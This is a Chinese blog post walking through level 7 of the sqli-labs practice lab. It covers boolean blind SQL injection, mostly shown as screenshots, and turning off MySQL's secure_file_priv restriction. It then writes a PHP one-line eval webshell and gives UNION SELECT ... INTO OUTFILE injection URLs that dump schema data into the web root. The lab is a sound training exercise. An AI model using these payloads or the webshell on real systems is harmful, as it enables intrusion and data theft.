<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>sqli-labs-----第7关 - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="sqli-labs-----第7关" />
<meta property="og:description" content="布尔盲注和一句话木马
布尔盲注：页面只返回 true/false
判断注入类型
判断数据库名长度
猜测数据库名
得到数据库名为security
猜测数据库security中表的数量
得到数据库中有4张表
猜测表名
..................
得到security数据库中4个表名分别为emails,referers,uagents,users
猜测users表中字段数
users表中字段数为3
猜测每个字段名长度
字段名长度分别为2，8，8
猜测字段名
第一个字段名：id
..................
得到第二个字段名：username
.................
得到第三个字段名：password 猜测username，password中数据
同样用burp suite抓包爆破
得到username，password的数据
完成
一句话木马
该关卡需要用到文件写入操作，所以需要开启MySQL中的文件写入
进入MySQL下的bin目录，用命令行连接数据库
查看是否开启文件写入
show variables like &#39;%secure%&#39;;
需要修改secure_file_priv参数值
secure_file_priv=&#39;/&#39;
NULL：限制mysql服务不允许导入/导出；
/tmp/：限制mysql的导入或导出只发生在/tmp/目录下；
没有具体值：不对mysql的导入/导出做限制
打开my.ini文件
查看修改是否成功
进行写入操作，写入一句话木马&lt;?php @eval($_post[&#39;password&#39;]);?&gt; 用文件写入爆出数据库信息
http://sqli.com/Less-7/?id=1&#39;)) union select user(),database(),(select group_concat(table_name) from information_schema.tables where table_schema=database()) into outfile &#39;E:\\site\\phpStudy_64\\phpstudy_pro\\WWW\\sqli\\Less-7\\1.txt&#39; --&#43; http://sqli.com/Less-7/?id=1&#39;)) union select version(),@@version_compile_os,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;) into outfile &#39;E:\\site\\phpStudy_64\\phpstudy_pro\\WWW\\sqli\\Less-7\\2." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/7d380e93771c8a064a02dba8c50fdf1c/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-11-09T13:58:10+08:00" />
<meta property="article:modified_time" content="2022-11-09T13:58:10+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">sqli-labs-----第7关</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <p>布尔盲注和一句话木马</p> 
<p><strong>布尔盲注</strong>：页面只返回 true/false</p> 
<p>判断注入类型</p> 
<p><img alt="" height="275" src="https://images2.imgbox.com/78/8c/pIZ9ZMud_o.png" width="965"></p> 
<p>判断数据库名长度</p> 
<p><img alt="" height="343" src="https://images2.imgbox.com/17/4a/nnQW4Ttx_o.png" width="1060"></p> 
<p><img alt="" height="129" src="https://images2.imgbox.com/ec/60/DmrvCwpm_o.png" width="845"></p> 
<p><img alt="" height="396" src="https://images2.imgbox.com/33/6d/f3zxxG2B_o.png" width="554"></p> 
<p><img alt="" height="358" src="https://images2.imgbox.com/a3/dd/wO6bmJvX_o.png" width="809"></p> 
<p><img alt="" height="396" src="https://images2.imgbox.com/ff/d4/jmT8sVOh_o.png" width="820"></p> 
<p>  猜测数据库名</p> 
<p><img alt="" height="226" src="https://images2.imgbox.com/f2/c9/A71qRBnK_o.png" width="1066"> <img alt="" height="461" src="https://images2.imgbox.com/6c/00/mLf8W6sl_o.png" width="571"></p> 
<p></p> 
<p><img alt="" height="430" src="https://images2.imgbox.com/e1/e8/mTIDUkbH_o.png" width="832"></p> 
<p><img alt="" height="398" src="https://images2.imgbox.com/ef/f1/u60gAmO9_o.png" width="812"></p> 
<p><img alt="" height="350" src="https://images2.imgbox.com/3b/6d/ggxA24xn_o.png" width="817"></p> 
<p><img alt="" height="381" src="https://images2.imgbox.com/b8/6b/f4fXNdfW_o.png" width="790"> <img alt="" height="291" src="https://images2.imgbox.com/34/b0/eMWXDpKZ_o.png" width="815"></p> 
<p> <img alt="" height="436" src="https://images2.imgbox.com/da/d2/8sA3dlfz_o.png" width="829"></p> 
<p><img alt="" height="383" src="https://images2.imgbox.com/12/f6/XzITajq6_o.png" width="816"></p> 
<p><img alt="" height="356" src="https://images2.imgbox.com/a3/9d/0ppMzfaL_o.png" width="815"> <img alt="" height="308" src="https://images2.imgbox.com/81/a8/yWc2M4a0_o.png" width="820"></p> 
<p> 得到数据库名为security</p> 
<p>猜测数据库security中表的数量</p> 
<p><img alt="" height="319" src="https://images2.imgbox.com/16/dd/Qz5VL9Un_o.png" width="1098"></p> 
<p><img alt="" height="174" src="https://images2.imgbox.com/06/7d/C30ARBfP_o.png" width="1058"></p> 
<p><img alt="" height="377" src="https://images2.imgbox.com/60/94/2on7ChxX_o.png" width="814"> 得到数据库中有4张表</p> 
<p> 猜测表名</p> 
<p><img alt="" height="360" src="https://images2.imgbox.com/3e/80/HVFaL5Ti_o.png" width="1200"></p> 
<p><img alt="" height="177" src="https://images2.imgbox.com/4c/e8/WEpmSafZ_o.png" width="1072">  </p> 
<p><img alt="" height="393" src="https://images2.imgbox.com/d1/a3/rWdTPDwE_o.png" width="821"></p> 
<p> <img alt="" height="283" src="https://images2.imgbox.com/0d/0a/g96cQn0i_o.png" width="825"></p> 
<p> ..................</p> 
<p>得到security数据库中4个表名分别为emails,referers,uagents,users</p> 
<p>猜测users表中字段数</p> 
<p><img alt="" height="323" src="https://images2.imgbox.com/49/78/9VzolSWu_o.png" width="1136"></p> 
<p><img alt="" height="161" src="https://images2.imgbox.com/0c/ec/Wao7EIxS_o.png" width="1071"></p> 
<p><img alt="" height="344" src="https://images2.imgbox.com/df/41/EsRX4jbu_o.png" width="812"> users表中字段数为3</p> 
<p> 猜测每个字段名长度</p> 
<p><img alt="" height="320" src="https://images2.imgbox.com/4c/86/F2AK7DNx_o.png" width="1200"></p> 
<p><img alt="" height="169" src="https://images2.imgbox.com/f6/bf/LU7Bb6Vs_o.png" width="1071"></p> 
<p><img alt="" height="422" src="https://images2.imgbox.com/c7/af/J9ArGIyt_o.png" width="819"></p> 
<p><img alt="" height="309" src="https://images2.imgbox.com/da/96/y3yBVCUZ_o.png" width="816"></p> 
<p><img alt="" height="299" src="https://images2.imgbox.com/82/34/GRZvE94q_o.png" width="816"> 字段名长度分别为2，8，8</p> 
<p> 猜测字段名</p> 
<p><img alt="" height="343" src="https://images2.imgbox.com/bb/a6/Lo0zB1U2_o.png" width="1200"></p> 
<p><img alt="" height="315" src="https://images2.imgbox.com/a5/9b/HVtRNTQh_o.png" width="825"></p> 
<p><img alt="" height="344" src="https://images2.imgbox.com/5d/42/StOxURte_o.png" width="819"> 第一个字段名：id</p> 
<p><img alt="" height="391" src="https://images2.imgbox.com/d1/7c/dscNcm8t_o.png" width="818"></p> 
<p> <img alt="" height="336" src="https://images2.imgbox.com/44/fc/IXSAwb86_o.png" width="806"></p> 
<p>..................</p> 
<p>得到第二个字段名：username</p> 
<p> <img alt="" height="335" src="https://images2.imgbox.com/17/45/ePOAH4M6_o.png" width="816"></p> 
<p> <img alt="" height="336" src="https://images2.imgbox.com/c4/af/1d0wy1kj_o.png" width="823"></p> 
<p>.................</p> 
<p>得到第三个字段名：password </p> 
<p> 猜测username，password中数据</p> 
<p><img alt="" height="273" src="https://images2.imgbox.com/6e/fb/iU8S22Vj_o.png" width="1057"></p> 
<p>同样用burp suite抓包爆破</p> 
<p>得到username，password的数据</p> 
<p>完成</p> 
<p> </p> 
<p><strong>一句话木马</strong></p> 
<p>该关卡需要用到<span style="color:#4da8ee;">文件写入</span>操作，所以需要开启MySQL中的文件写入<br> 进入MySQL下的bin目录，用命令行连接数据库</p> 
<p>查看是否开启文件写入</p> 
<p>show variables like '%secure%';</p> 
<p><img alt="" height="457" src="https://images2.imgbox.com/a9/f2/9OaVqZNl_o.png" width="778"> </p> 
<p>需要修改secure_file_priv参数值</p> 
<p>secure_file_priv='/'</p> 
<p>NULL：限制mysql服务不允许导入/导出；</p> 
<p>/tmp/：限制mysql的导入或导出只发生在/tmp/目录下；</p> 
<p>没有具体值：不对mysql的导入/导出做限制</p> 
<p>打开my.ini文件</p> 
<p><img alt="" height="296" src="https://images2.imgbox.com/de/2e/YYyWtr5m_o.png" width="696"></p> 
<p><img alt="" height="133" src="https://images2.imgbox.com/2f/31/lnMjGvfL_o.png" width="339"> </p> 
<p>查看修改是否成功</p> 
<p><img alt="" height="282" src="https://images2.imgbox.com/de/85/FsikNbKD_o.png" width="489"> </p> 
<p>进行写入操作，写入一句话木马&lt;?php @eval($_post['password']);?&gt; </p> 
<p><img alt="" height="293" src="https://images2.imgbox.com/ea/ea/HErTvsvg_o.png" width="1081"></p> 
<p> <img alt="" height="237" src="https://images2.imgbox.com/33/4f/HKXl9nlN_o.png" width="817"></p> 
<p>用文件写入爆出数据库信息</p> 
<pre><code class="hljs">http://sqli.com/Less-7/?id=1')) union select user(),database(),(select group_concat(table_name) from information_schema.tables where table_schema=database()) into outfile 'E:\\site\\phpStudy_64\\phpstudy_pro\\WWW\\sqli\\Less-7\\1.txt' --+</code></pre> 
<p><img alt="" height="320" src="https://images2.imgbox.com/8e/2f/89UNbRv1_o.png" width="1200"> </p> 
<p> </p> 
<pre><code class="hljs">http://sqli.com/Less-7/?id=1')) union select version(),@@version_compile_os,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users') into outfile 'E:\\site\\phpStudy_64\\phpstudy_pro\\WWW\\sqli\\Less-7\\2.txt' --+</code></pre> 
<p><img alt="" height="216" src="https://images2.imgbox.com/ab/05/5Y3V5ZnM_o.png" width="1200"></p> 
<p> 完成！！！</p> 
<p></p> 
<p></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/788a83666ee10bf8f448496e4fbc2bce/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">FPN（特征金字塔结构）详解</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/586ae072d4f86f99b1544cc5e1d98784/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">java基础08--抽象类、接口、内部类</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>